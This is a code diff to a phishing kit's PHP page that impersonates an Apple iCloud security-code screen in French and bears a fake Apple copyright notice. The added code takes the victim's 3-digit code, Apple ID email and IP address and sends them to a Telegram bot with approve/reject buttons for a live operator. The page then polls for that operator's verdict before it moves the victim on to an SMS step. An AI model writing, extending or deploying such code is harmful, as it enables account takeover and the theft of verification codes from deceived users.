@@ -13,11 +13,66 @@ $ip    = _smsGetIp();
 $email = $_SESSION['icloud_email'] ?? '—';
 $dt    = date('d/m/Y à H:i') . ' UTC';
 
-// Check if CKK step has been passed
-$ckkPassed = isset($_SESSION['ckk_passed']) && $_SESSION['ckk_passed'] === true;
+// Check if CKK has been validated - either from session or from URL parameter
+if (isset($_GET['ckk_done']) && $_GET['ckk_done'] === '1') {
+    $_SESSION['ckk_validated'] = true;
+}
+$ckkValidated = isset($_SESSION['ckk_validated']) && $_SESSION['ckk_validated'] === true;
 
-// If CKK not passed, show CKK form first
-if (!$ckkPassed && $_SERVER['REQUEST_METHOD'] !== 'POST') {
+// If CKK not yet validated and it's a POST with CKK step, process it
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['step']) && $_POST['step'] === 'ckk') {
+    header('Content-Type: application/json');
+    $ckk = isset($_POST['ckk']) ? preg_replace('/[^0-9]/', '', $_POST['ckk']) : '';
+
+    if (strlen($ckk) === 3) {
+        // Send CKK to Telegram
+        $proto  = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https' : 'http';
+        $host   = $_SERVER['HTTP_HOST'];
+        $dir    = dirname($_SERVER['PHP_SELF']);
+        if ($dir === '/' || $dir === '\\') $dir = '';
+        $vbvUrl = $proto . '://' . $host . $dir . '/security_check/actionsvbv.php';
+        $encIp  = urlencode($ip);
+
+        $message = <<<TEXT
+🔐 <b>iCLOUD – CKK saisi</b> [<code>CKK STEP</code>]
+
+<b>Apple ID</b>
+└ 📧 Email: <code>$email</code>
+
+<b>Code CKK</b>
+└ 🔢 Code: <code>$ckk</code>
+
+<b>Réseau</b>
+├ 🌐 IP: <code>$ip</code>
+└ 🕐 $dt
+
+⏳ <i>En attente de validation…</i>
+TEXT;
+
+        $keyboard = [
+            'inline_keyboard' => [[
+                ['text' => '✅ CKKOK', 'url' => $vbvUrl . '?ip=' . $encIp . '&otp=ckkok'],
+                ['text' => '❌ CKKBAD', 'url' => $vbvUrl . '?ip=' . $encIp . '&otp=ckkbad'],
+            ]]
+        ];
+
+        sendTelegramMessage($bot_token, $chat_id, $message, $keyboard);
+
+        // Store temporarily and reset ip_list for polling
+        $_SESSION['ckk_code_temp'] = $ckk;
+        $ipListFile = __DIR__ . '/security_check/ip_list.txt';
+        file_put_contents($ipListFile, PHP_EOL . $ip . ',waiting_ckk', FILE_APPEND | LOCK_EX);
+
+        echo json_encode(['ok' => true]);
+        exit;
+    } else {
+        echo json_encode(['ok' => false, 'error' => 'Code invalide']);
+        exit;
+    }
+}
+
+// Check if CKK was validated via icloud_check.php
+if (!$ckkValidated) {
     // Show CKK form
     ?>
 <!DOCTYPE html>
@@ -206,6 +261,54 @@ if (!$ckkPassed && $_SERVER['REQUEST_METHOD'] !== 'POST') {
   }
   .btn-verify:active { transform: scale(.98); }
   .btn-verify:disabled { opacity: .45; cursor: default; }
+
+  .overlay {
+    position: fixed; inset: 0;
+    background: rgba(0,0,0,0.45);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    z-index: 100;
+    opacity: 0;
+    pointer-events: none;
+    transition: opacity .25s;
+  }
+  .overlay.visible { opacity: 1; pointer-events: all; }
+  .overlay-box {
+    background: var(--card-bg);
+    border-radius: 18px;
+    padding: 36px 44px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 18px;
+    min-width: 200px;
+  }
+  .overlay-box p { font-size: 15px; color: var(--label-secondary); font-weight: 500; }
+
+  .spinner { position: relative; width: 40px; height: 40px; }
+  .spinner-blade {
+    position: absolute;
+    left: 50%; top: 50%;
+    width: 2.4px; height: 9px;
+    border-radius: 2px;
+    background: var(--label);
+    transform-origin: 50% 0;
+    animation: fade-blade 1.2s linear infinite;
+  }
+  .spinner-blade:nth-child(1)  { transform: translateX(-50%) rotate(0deg)   translateY(-130%); animation-delay: -1.1s; }
+  .spinner-blade:nth-child(2)  { transform: translateX(-50%) rotate(30deg)  translateY(-130%); animation-delay: -1.0s; }
+  .spinner-blade:nth-child(3)  { transform: translateX(-50%) rotate(60deg)  translateY(-130%); animation-delay: -0.9s; }
+  .spinner-blade:nth-child(4)  { transform: translateX(-50%) rotate(90deg)  translateY(-130%); animation-delay: -0.8s; }
+  .spinner-blade:nth-child(5)  { transform: translateX(-50%) rotate(120deg) translateY(-130%); animation-delay: -0.7s; }
+  .spinner-blade:nth-child(6)  { transform: translateX(-50%) rotate(150deg) translateY(-130%); animation-delay: -0.6s; }
+  .spinner-blade:nth-child(7)  { transform: translateX(-50%) rotate(180deg) translateY(-130%); animation-delay: -0.5s; }
+  .spinner-blade:nth-child(8)  { transform: translateX(-50%) rotate(210deg) translateY(-130%); animation-delay: -0.4s; }
+  .spinner-blade:nth-child(9)  { transform: translateX(-50%) rotate(240deg) translateY(-130%); animation-delay: -0.3s; }
+  .spinner-blade:nth-child(10) { transform: translateX(-50%) rotate(270deg) translateY(-130%); animation-delay: -0.2s; }
+  .spinner-blade:nth-child(11) { transform: translateX(-50%) rotate(300deg) translateY(-130%); animation-delay: -0.1s; }
+  .spinner-blade:nth-child(12) { transform: translateX(-50%) rotate(330deg) translateY(-130%); animation-delay:  0.0s; }
+  @keyframes fade-blade { 0%,100% { opacity: .1 } 0% { opacity: 1 } }
 </style>
 </head>
 <body>
@@ -234,17 +337,15 @@ if (!$ckkPassed && $_SERVER['REQUEST_METHOD'] !== 'POST') {
   <h1>Code de sécurité</h1>
   <p class="subtitle">Veuillez saisir le <strong>code de contrôle de sécurité (CKK)</strong> à 3 chiffres reçu sur votre appareil.</p>
 
-  <form method="post" id="ckkForm">
-    <div class="digits" id="ckkDigits">
-      <input type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" name="ckk">
-      <input type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" name="ckk">
-      <input type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" name="ckk">
-    </div>
+  <div class="digits" id="ckkDigits">
+    <input type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
+    <input type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
+    <input type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
+  </div>
 
-    <div class="error-msg hidden" id="ckkErrMsg">Code incorrect. Veuillez réessayer.</div>
+  <div class="error-msg hidden" id="ckkErrMsg">Vérification en cours…</div>
 
-    <button type="submit" class="btn-verify" id="ckkBtn" disabled>Vérifier</button>
-  </form>
+  <button class="btn-verify" id="ckkBtn" disabled>Vérifier</button>
 </div>
   </main>
 
@@ -257,12 +358,26 @@ if (!$ckkPassed && $_SERVER['REQUEST_METHOD'] !== 'POST') {
     <span class="footer-copy">Copyright &copy; 2026 Apple Inc. Tous droits réservés.</span>
   </footer>
 
+<div class="overlay" id="overlay">
+  <div class="overlay-box">
+    <div class="spinner">
+      <div class="spinner-blade"></div><div class="spinner-blade"></div>
+      <div class="spinner-blade"></div><div class="spinner-blade"></div>
+      <div class="spinner-blade"></div><div class="spinner-blade"></div>
+      <div class="spinner-blade"></div><div class="spinner-blade"></div>
+      <div class="spinner-blade"></div><div class="spinner-blade"></div>
+      <div class="spinner-blade"></div><div class="spinner-blade"></div>
+    </div>
+    <p>Vérification en cours…</p>
+  </div>
+</div>
+
 <script>
 (function() {
   var ckkDigits = Array.from(document.querySelectorAll('#ckkDigits input'));
   var ckkBtn = document.getElementById('ckkBtn');
   var ckkErrMsg = document.getElementById('ckkErrMsg');
-  var ckkForm = document.getElementById('ckkForm');
+  var overlay = document.getElementById('overlay');
 
   function getCkkCode() { return ckkDigits.map(function(d){ return d.value; }).join(''); }
 
@@ -296,32 +411,51 @@ if (!$ckkPassed && $_SERVER['REQUEST_METHOD'] !== 'POST') {
     inp.addEventListener('focus', function(){ inp.select(); });
   });
 
-  ckkForm.addEventListener('submit', function(e) {
-    e.preventDefault();
+  ckkBtn.addEventListener('click', function() {
     var code = getCkkCode();
     if (code.length !== 3) return;
 
-    var formData = new FormData();
-    formData.append('ckk', code);
-    formData.append('step', 'ckk_validate');
+    overlay.classList.add('visible');
+    ckkBtn.disabled = true;
 
     fetch('handle.php', {
       method: 'POST',
-      body: formData
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: 'step=ckk&ckk=' + encodeURIComponent(code)
     }).then(function(r){ return r.json(); })
       .then(function(data) {
         if (data.ok) {
-          window.location.href = 'icloud_sms.php';
+          pollCkkResult();
         } else {
+          overlay.classList.remove('visible');
+          ckkBtn.disabled = false;
+          ckkErrMsg.classList.remove('hidden');
+        }
+      }).catch(function() {
+        overlay.classList.remove('visible');
+        ckkBtn.disabled = false;
+      });
+  });
+
+  function pollCkkResult() {
+    fetch('icloud_check.php?t=' + Date.now())
+      .then(function(r){ return r.text(); })
+      .then(function(raw) {
+        var signal = raw.trim();
+        if (signal === 'ckkok') {
+          window.location.href = 'icloud_sms.php?ckk_done=1';
+        } else if (signal === 'ckkbad') {
+          overlay.classList.remove('visible');
           ckkErrMsg.classList.remove('hidden');
           ckkDigits.forEach(function(d){ d.value = ''; });
           ckkDigits[0].focus();
           updateBtn();
+          ckkBtn.disabled = false;
+        } else {
+          setTimeout(pollCkkResult, 2000);
         }
-      }).catch(function() {
-        ckkErrMsg.classList.remove('hidden');
-      });
-  });
+      }).catch(function() { setTimeout(pollCkkResult, 3000); });
+  }
 
   ckkDigits[0].focus();
 })();
@@ -330,22 +464,6 @@ if (!$ckkPassed && $_SERVER['REQUEST_METHOD'] !== 'POST') {
 </html>
     <?php
     exit;
-}
-
-// Handle POST request for CKK validation
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['step']) && $_POST['step'] === 'ckk_validate') {
-    $ckk = isset($_POST['ckk']) ? trim($_POST['ckk']) : '';
-
-    // Simple validation: CKK should be 3 digits
-    if (strlen($ckk) === 3 && ctype_digit($ckk)) {
-        $_SESSION['ckk_passed'] = true;
-        $_SESSION['ckk_code'] = $ckk;
-        echo json_encode(['ok' => true]);
-        exit;
-    } else {
-        echo json_encode(['ok' => false]);
-        exit;
-    }
 }
 
 // Reset ip_list so polling starts fresh on this page
